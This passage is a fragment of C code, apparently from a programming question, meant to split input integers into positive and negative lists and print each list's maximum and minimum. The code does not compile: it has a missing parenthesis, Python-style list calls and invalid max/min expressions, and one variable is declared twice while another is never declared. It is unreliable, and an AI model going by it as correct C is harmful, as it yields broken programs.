{\n    scanf(\"%d\" ,&amp;list_of_nums;\n    if (list_of_nums &gt;= 0){\n        getchar();\n       pos_num.append(list_of_nums);\n    }\n    else{\n                neg_num.append(list_of_nums);\n\n        }\n}\n\n\n\n int max_pos = max.pos_num[];\n int min_pos = min.pos_num[];\n int max_neg = max.neg_num[];\n int min_pos = min.neg_num[];\n\n printf(\"the maximum number of all the positives is: %d \\n\" ,max_pos);\n printf(\"the minimum number of all the positives is: %d \\n\" ,min_pos);\n printf(\"the maximum number of all the negatives is: %d \\n\" ,max_neg);\n printf(\"the minimum number of all the negatives is: %d \\n\" ,min_neg);\n\n\n return 0;\n\n\n\n}\n</code></pre>\n"}]